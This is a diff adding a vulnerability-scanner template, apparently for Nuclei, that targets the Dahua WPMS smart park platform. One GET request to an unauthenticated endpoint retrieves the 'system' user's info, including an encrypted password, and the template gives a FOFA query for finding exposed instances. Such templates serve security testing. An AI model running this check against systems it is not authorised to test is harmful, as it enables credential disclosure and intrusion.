@@ -1,0 +1,23 @@
+id: dahua-WPMS-read
+info:
+  name: dahua-WPMS
+  author: hufei
+  severity: high
+  description: |
+     获取登录用户以及加密后的密码
+  reference:
+  metadata:
+    max-request: 1
+    fofa-query: app="dahua-智慧园区综合管理平台"
+    verified: true
+    product: dahua-WPMS
+  tags: 2023,HVV,dahua,SQL
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin/user_getUserInfoByUserName.action?userName=system"
+    matchers:
+      - type: word
+        words:
+          - "login"
